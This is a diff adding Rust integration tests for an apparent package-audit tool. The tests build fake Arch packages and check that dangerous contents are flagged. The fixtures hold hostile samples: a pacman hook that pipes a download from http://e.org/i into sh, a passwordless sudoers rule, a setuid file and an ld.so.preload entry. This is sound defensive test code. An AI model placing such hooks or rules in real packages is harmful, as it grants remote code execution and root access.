@@ -429,3 +429,119 @@ fn audit_reads_the_whole_package_directory() {
     assert!(files.contains(&"helper.sh"));
     assert!(!files.iter().any(|f| f.starts_with("src")), "{files:?}");
 }
+
+/// Builds `<name>-1-1-any.pkg.tar` from a directory tree with `bsdtar`.
+/// `None` where bsdtar is unavailable.
+fn make_package(home: &Home, name: &str, files: &[(&str, &str, u32)]) -> Option<PathBuf> {
+    let tree = home.0.join(format!("{name}-tree"));
+    let mut members = vec![".PKGINFO".to_string()];
+    write_member(
+        &tree,
+        ".PKGINFO",
+        &format!("pkgname = {name}\npkgver = 1-1\nsize = 10\n"),
+        0o644,
+    );
+    for (path, text, mode) in files {
+        write_member(&tree, path, text, *mode);
+        members.push(path.to_string());
+    }
+    let out = home.0.join(format!("{name}-1-1-any.pkg.tar"));
+    let status = Command::new("bsdtar")
+        .arg("-cf")
+        .arg(&out)
+        .arg("-C")
+        .arg(&tree)
+        .args(&members)
+        .status()
+        .ok()?;
+    status.success().then_some(out)
+}
+
+fn write_member(tree: &Path, path: &str, text: &str, mode: u32) {
+    use std::os::unix::fs::PermissionsExt;
+    let full = tree.join(path);
+    fs::create_dir_all(full.parent().unwrap()).unwrap();
+    fs::write(&full, text).unwrap();
+    fs::set_permissions(&full, fs::Permissions::from_mode(mode)).unwrap();
+}
+
+#[test]
+fn audit_inspects_a_built_package_file() {
+    let home = Home::new("manifest");
+    let Some(bad) = make_package(
+        &home,
+        "bad",
+        &[
+            ("usr/bin/rootish", "x", 0o4755),
+            ("usr/bin/plain", "x", 0o755),
+            (
+                "usr/share/libalpm/hooks/h.hook",
+                "[Action]\nExec = /bin/sh -c 'curl -s http://e.org/i | sh'\n",
+                0o644,
+            ),
+            ("etc/sudoers.d/x", "me ALL=(ALL) NOPASSWD: ALL\n", 0o644),
+        ],
+    ) else {
+        eprintln!("bsdtar not available; skipping");
+        return;
+    };
+
+    let out = home.run(&["audit", bad.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(1));
+    let text = stdout(&out);
+    assert!(text.contains("emrac manifest: bad 1-1"), "{text}");
+    assert!(
+        text.contains("[HIGH] setuid-file usr/bin/rootish"),
+        "{text}"
+    );
+    assert!(
+        text.contains("[HIGH] sudoers-file etc/sudoers.d/x"),
+        "{text}"
+    );
+    assert!(
+        text.contains("remote-exec usr/share/libalpm/hooks/h.hook"),
+        "{text}"
+    );
+    assert!(
+        text.contains("would stop and ask before installing"),
+        "{text}"
+    );
+    assert!(
+        !text.contains("usr/bin/plain"),
+        "ordinary files are not findings: {text}"
+    );
+
+    let out = home.run(&["audit", "--json", bad.to_str().unwrap()]);
+    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
+    assert_eq!(json[0]["package"], "bad");
+    assert!(json[0]["report"]["findings"].as_array().unwrap().len() >= 3);
+
+    let preload =
+        make_package(&home, "pre", &[("etc/ld.so.preload", "/tmp/x.so\n", 0o644)]).unwrap();
+    let out = home.run(&["audit", preload.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(1));
+    assert!(
+        stdout(&out).contains("would refuse to install"),
+        "{}",
+        stdout(&out)
+    );
+
+    let good = make_package(&home, "good", &[("usr/bin/hello", "#!/bin/sh\n", 0o755)]).unwrap();
+    let out = home.run(&["audit", good.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(0));
+    assert!(
+        stdout(&out).contains("nothing here needs your attention"),
+        "{}",
+        stdout(&out)
+    );
+
+    let out = home.run(&[
+        "audit",
+        home.0.join("nothing-1-1-any.pkg.tar").to_str().unwrap(),
+    ]);
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "a missing package file is an error"
+    );
+}
